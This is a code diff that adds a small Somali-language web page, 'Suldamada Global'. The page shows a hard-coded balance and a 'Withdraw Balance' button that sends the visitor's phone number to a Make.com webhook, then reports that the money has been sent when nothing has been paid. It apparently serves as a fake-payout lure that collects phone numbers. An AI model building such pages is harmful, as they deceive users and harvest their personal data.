@@ -1,14 +1,28 @@
-<script>
-function sendwithdraw() {
-    const phone = document.getElementById('phone').value;
-    const balance = document.getElementById('balance').innerText;
-    
-    fetch('https://hook.eu1.make.com/5a5xrq0pc9dmmne8nna40wdg26ud4o41', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phone: phone, amount: balance })
-    });
-    
-    alert("Waa la diray!");
-}
-</script>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Suldamada Global</title>
+</head>
+<body>
+    <div class="app-container">
+        <h1>Suldamada Global</h1>
+        <p>Haraagaaga: <span id="balance">32.75</span></p>
+        <input type="text" id="phone" placeholder="Geli lambarkaaga">
+        <button onclick="sendwithdraw()">Withdraw Balance</button>
+    </div>
+
+    <script>
+    function sendwithdraw() {
+        const phone = document.getElementById('phone').value;
+        const balance = document.getElementById('balance').innerText;
+        fetch('https://hook.eu1.make.com/5a5xrq0pc9dmmne8nna40wdg26ud4o41', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: phone, amount: balance })
+        });
+        alert("Waa la diray!");
+    }
+    </script>
+</body>
+</html>
